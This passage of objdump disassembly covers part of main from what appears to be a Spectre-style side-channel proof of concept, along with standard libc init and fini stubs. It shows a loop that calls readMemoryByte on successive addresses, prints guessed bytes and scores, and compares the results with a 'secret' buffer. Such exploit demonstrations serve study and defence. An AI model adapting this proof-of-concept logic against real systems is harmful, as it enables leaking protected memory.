 cd8:	48 8d 55 cc          	lea    rdx,[rbp-0x34]
 cdc:	48 8d 35 18 02 00 00 	lea    rsi,[rip+0x218]        # efb <_IO_stdin_used+0x1b>
 ce3:	48 89 c7             	mov    rdi,rax
 ce6:	b8 00 00 00 00       	mov    eax,0x0
 ceb:	e8 b0 f9 ff ff       	call   6a0 <__isoc99_sscanf@plt>
 cf0:	8b 45 cc             	mov    eax,DWORD PTR [rbp-0x34]
 cf3:	89 c6                	mov    esi,eax
 cf5:	48 8d 3d 02 02 00 00 	lea    rdi,[rip+0x202]        # efe <_IO_stdin_used+0x1e>
 cfc:	b8 00 00 00 00       	mov    eax,0x0
 d01:	e8 8a f9 ff ff       	call   690 <printf@plt>
 d06:	e9 f8 00 00 00       	jmp    e03 <main+0x1f8>
 d0b:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
 d0f:	48 89 c6             	mov    rsi,rax
 d12:	48 8d 3d f8 01 00 00 	lea    rdi,[rip+0x1f8]        # f11 <_IO_stdin_used+0x31>
 d19:	b8 00 00 00 00       	mov    eax,0x0
 d1e:	e8 6d f9 ff ff       	call   690 <printf@plt>
 d23:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
 d27:	48 8d 50 01          	lea    rdx,[rax+0x1]
 d2b:	48 89 55 e0          	mov    QWORD PTR [rbp-0x20],rdx
 d2f:	48 8d 55 ec          	lea    rdx,[rbp-0x14]
 d33:	48 8d 4d f6          	lea    rcx,[rbp-0xa]
 d37:	48 89 ce             	mov    rsi,rcx
 d3a:	48 89 c7             	mov    rdi,rax
 d3d:	e8 d5 fa ff ff       	call   817 <readMemoryByte>
 d42:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
 d45:	8b 55 f0             	mov    edx,DWORD PTR [rbp-0x10]
 d48:	01 d2                	add    edx,edx
 d4a:	39 d0                	cmp    eax,edx
 d4c:	7c 09                	jl     d57 <main+0x14c>
 d4e:	48 8d 05 d8 01 00 00 	lea    rax,[rip+0x1d8]        # f2d <_IO_stdin_used+0x4d>
 d55:	eb 07                	jmp    d5e <main+0x153>
 d57:	48 8d 05 d9 01 00 00 	lea    rax,[rip+0x1d9]        # f37 <_IO_stdin_used+0x57>
 d5e:	48 89 c6             	mov    rsi,rax
 d61:	48 8d 3d db 01 00 00 	lea    rdi,[rip+0x1db]        # f43 <_IO_stdin_used+0x63>
 d68:	b8 00 00 00 00       	mov    eax,0x0
 d6d:	e8 1e f9 ff ff       	call   690 <printf@plt>
 d72:	8b 55 ec             	mov    edx,DWORD PTR [rbp-0x14]
 d75:	0f b6 45 f6          	movzx  eax,BYTE PTR [rbp-0xa]
 d79:	3c 1f                	cmp    al,0x1f
 d7b:	76 11                	jbe    d8e <main+0x183>
 d7d:	0f b6 45 f6          	movzx  eax,BYTE PTR [rbp-0xa]
 d81:	3c 7e                	cmp    al,0x7e
 d83:	77 09                	ja     d8e <main+0x183>
 d85:	0f b6 45 f6          	movzx  eax,BYTE PTR [rbp-0xa]
 d89:	0f b6 c0             	movzx  eax,al
 d8c:	eb 05                	jmp    d93 <main+0x188>
 d8e:	b8 3f 00 00 00       	mov    eax,0x3f
 d93:	0f b6 4d f6          	movzx  ecx,BYTE PTR [rbp-0xa]
 d97:	0f b6 f1             	movzx  esi,cl
 d9a:	89 d1                	mov    ecx,edx
 d9c:	89 c2                	mov    edx,eax
 d9e:	48 8d 3d a3 01 00 00 	lea    rdi,[rip+0x1a3]        # f48 <_IO_stdin_used+0x68>
 da5:	b8 00 00 00 00       	mov    eax,0x0
 daa:	e8 e1 f8 ff ff       	call   690 <printf@plt>
 daf:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
 db2:	85 c0                	test   eax,eax
 db4:	7e 1d                	jle    dd3 <main+0x1c8>
 db6:	8b 55 f0             	mov    edx,DWORD PTR [rbp-0x10]
 db9:	0f b6 45 f7          	movzx  eax,BYTE PTR [rbp-0x9]
 dbd:	0f b6 c0             	movzx  eax,al
 dc0:	89 c6                	mov    esi,eax
 dc2:	48 8d 3d 99 01 00 00 	lea    rdi,[rip+0x199]        # f62 <_IO_stdin_used+0x82>
 dc9:	b8 00 00 00 00       	mov    eax,0x0
 dce:	e8 bd f8 ff ff       	call   690 <printf@plt>
 dd3:	bf 0a 00 00 00       	mov    edi,0xa
 dd8:	e8 83 f8 ff ff       	call   660 <putchar@plt>
 ddd:	0f b6 45 f6          	movzx  eax,BYTE PTR [rbp-0xa]
 de1:	88 45 cb             	mov    BYTE PTR [rbp-0x35],al
 de4:	48 8b 15 f5 12 20 00 	mov    rdx,QWORD PTR [rip+0x2012f5]        # 2020e0 <secret>
 deb:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
 dee:	48 98                	cdqe   
 df0:	48 01 d0             	add    rax,rdx
 df3:	0f b6 00             	movzx  eax,BYTE PTR [rax]
 df6:	38 45 cb             	cmp    BYTE PTR [rbp-0x35],al
 df9:	75 04                	jne    dff <main+0x1f4>
 dfb:	83 45 d4 01          	add    DWORD PTR [rbp-0x2c],0x1
 dff:	83 45 d8 01          	add    DWORD PTR [rbp-0x28],0x1
 e03:	8b 45 cc             	mov    eax,DWORD PTR [rbp-0x34]
 e06:	83 e8 01             	sub    eax,0x1
 e09:	89 45 cc             	mov    DWORD PTR [rbp-0x34],eax
 e0c:	8b 45 cc             	mov    eax,DWORD PTR [rbp-0x34]
 e0f:	85 c0                	test   eax,eax
 e11:	0f 89 f4 fe ff ff    	jns    d0b <main+0x100>
 e17:	8b 45 d4             	mov    eax,DWORD PTR [rbp-0x2c]
 e1a:	01 c0                	add    eax,eax
 e1c:	39 45 d8             	cmp    DWORD PTR [rbp-0x28],eax
 e1f:	7f 07                	jg     e28 <main+0x21d>
 e21:	c7 45 dc 01 00 00 00 	mov    DWORD PTR [rbp-0x24],0x1
 e28:	8b 4d d8             	mov    ecx,DWORD PTR [rbp-0x28]
 e2b:	8b 55 d4             	mov    edx,DWORD PTR [rbp-0x2c]
 e2e:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
 e31:	89 c6                	mov    esi,eax
 e33:	48 8d 3d 46 01 00 00 	lea    rdi,[rip+0x146]        # f80 <_IO_stdin_used+0xa0>
 e3a:	b8 00 00 00 00       	mov    eax,0x0
 e3f:	e8 4c f8 ff ff       	call   690 <printf@plt>
 e44:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
 e47:	48 8b 4d f8          	mov    rcx,QWORD PTR [rbp-0x8]
 e4b:	64 48 33 0c 25 28 00 	xor    rcx,QWORD PTR fs:0x28
 e52:	00 00 
 e54:	74 05                	je     e5b <main+0x250>
 e56:	e8 25 f8 ff ff       	call   680 <__stack_chk_fail@plt>
 e5b:	c9                   	leave  
 e5c:	c3                   	ret    
 e5d:	0f 1f 00             	nop    DWORD PTR [rax]

0000000000000e60 <__libc_csu_init>:
 e60:	41 57                	push   r15
 e62:	41 56                	push   r14
 e64:	49 89 d7             	mov    r15,rdx
 e67:	41 55                	push   r13
 e69:	41 54                	push   r12
 e6b:	4c 8d 25 26 0f 20 00 	lea    r12,[rip+0x200f26]        # 201d98 <__frame_dummy_init_array_entry>
 e72:	55                   	push   rbp
 e73:	48 8d 2d 26 0f 20 00 	lea    rbp,[rip+0x200f26]        # 201da0 <__init_array_end>
 e7a:	53                   	push   rbx
 e7b:	41 89 fd             	mov    r13d,edi
 e7e:	49 89 f6             	mov    r14,rsi
 e81:	4c 29 e5             	sub    rbp,r12
 e84:	48 83 ec 08          	sub    rsp,0x8
 e88:	48 c1 fd 03          	sar    rbp,0x3
 e8c:	e8 9f f7 ff ff       	call   630 <_init>
 e91:	48 85 ed             	test   rbp,rbp
 e94:	74 20                	je     eb6 <__libc_csu_init+0x56>
 e96:	31 db                	xor    ebx,ebx
 e98:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
 e9f:	00 
 ea0:	4c 89 fa             	mov    rdx,r15
 ea3:	4c 89 f6             	mov    rsi,r14
 ea6:	44 89 ef             	mov    edi,r13d
 ea9:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
 ead:	48 83 c3 01          	add    rbx,0x1
 eb1:	48 39 dd             	cmp    rbp,rbx
 eb4:	75 ea                	jne    ea0 <__libc_csu_init+0x40>
 eb6:	48 83 c4 08          	add    rsp,0x8
 eba:	5b                   	pop    rbx
 ebb:	5d                   	pop    rbp
 ebc:	41 5c                	pop    r12
 ebe:	41 5d                	pop    r13
 ec0:	41 5e                	pop    r14
 ec2:	41 5f                	pop    r15
 ec4:	c3                   	ret    
 ec5:	90                   	nop
 ec6:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
 ecd:	00 00 00 

0000000000000ed0 <__libc_csu_fini>:
 ed0:	f3 c3                	repz ret 

Disassembly of section .fini:

0000000000000ed4 <_fini>:
 ed4:	48 83 ec 08          	sub    rsp,0x8
 ed8:	48 83 c4 08          	add    rsp,0x8
 edc:	c3                   	ret    
